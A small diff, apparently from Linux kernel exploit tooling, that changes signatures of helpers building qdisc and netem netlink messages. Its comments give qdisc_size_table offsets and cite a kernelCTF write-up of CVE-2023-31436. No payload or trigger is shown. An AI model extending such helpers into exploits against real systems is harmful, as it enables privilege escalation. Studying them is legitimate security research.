@@ -197,7 +197,7 @@ struct tf_msg * hfscClassDel(u32 classid){
 
 
 
-struct tf_msg * contactQdiscStab(struct tf_msg * m, char *data , size_t size){
+struct tf_msg * contactQdiscStab(struct tf_msg * m, char *data , u64 size){
     // 0x3c for header
     // struct qdisc_size_table {
     // 	struct callback_head       rcu __attribute__((__aligned__(8))); /*     0  0x10 */
@@ -320,7 +320,7 @@ struct tf_msg *qfqFilterAdd(unsigned short prio) {
 }
 
 
-struct tf_msg * netemQdiscAdd(const char *name,u32 parent, u32 handle, u32 usec) {
+struct tf_msg * netemQdiscAdd(const char *name,u32 handle, u32 parent, u32 usec) {
     // Learned from KCTF cve-2023-31436 write up
     // Kernel Handler: function hfsc_init_qdisc
     struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
